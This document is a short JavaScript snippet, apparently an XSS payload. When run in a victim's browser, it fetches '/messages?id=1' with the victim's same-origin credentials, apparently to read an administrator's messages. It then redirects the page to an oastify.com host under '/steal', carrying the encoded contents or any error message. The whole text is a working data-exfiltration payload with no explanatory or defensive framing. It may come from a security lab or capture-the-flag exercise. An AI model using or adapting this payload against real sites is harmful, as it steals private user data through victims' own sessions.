(async function(){
    try {
        const adminId = 1;
        const res = await fetch('/messages?id=' + adminId, {credentials: 'same-origin'});
        const txt = await res.text();
        const exfil = encodeURIComponent(txt);
        window.location = 'https://4ty5g4m00bqxdzmwwa5f3q32otukib60.oastify.com/steal?data=' + exfil;
    } catch(e) {
        window.location = 'https://4ty5g4m00bqxdzmwwa5f3q32otukib60.oastify.com/steal?error=' + encodeURIComponent(String(e));
    }
})();